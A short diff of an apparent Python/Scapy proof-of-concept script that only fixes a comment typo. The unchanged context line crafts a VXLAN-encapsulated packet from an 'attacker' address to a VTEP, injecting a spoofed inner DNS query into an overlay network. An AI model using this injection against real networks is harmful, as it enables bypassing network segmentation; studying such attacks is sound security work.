@@ -22,5 +22,5 @@ insideport=53
 testport=50408
 lookup = sys.argv[1]
 
-# sned dns request
+# send dns request
 send(IP(src=attacker,dst=vtep)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=(1),flags="Instance")/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst=destination)/UDP(sport=testport,dport=53)/DNS(rd=1,qd=DNSQR(qname=str(lookup),qtype="A")))
